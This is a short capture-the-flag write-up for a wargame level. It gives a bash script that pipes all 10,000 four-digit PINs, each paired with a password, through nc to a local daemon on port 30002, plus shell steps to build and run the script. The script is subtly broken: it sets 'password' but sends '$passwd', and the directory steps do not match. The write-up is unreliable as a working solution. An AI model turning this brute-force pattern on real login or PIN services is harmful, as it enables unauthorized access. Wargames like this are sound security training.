#level24

##Goal

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time

##Solution
Here we should write a script that generates all the combinations of 4 digit pin then append this with password with a space and then send it to the 30002 port
here first i made a temorary file and then create a script file 
write this code of line in the file using nano
Following is  the script
```
#!/bin/bash
password="currentPssword"
for i in {0000..9999}; do
            echo "$passwd $i"
done | nc localhost 30002  | grep -v Wrong | grep -v "I am the pincode checker for user bandit25"
```
then i changed the mode of script file and run it
here is the solutions
```
mktemp -d
cd temp-d
touch script.sh
nano script.sh
ls -la script.sh
chmod +x script.sh
./script.sh
rm script.sh
cd ~
rmdir temporaryDirectoryYouCreated

```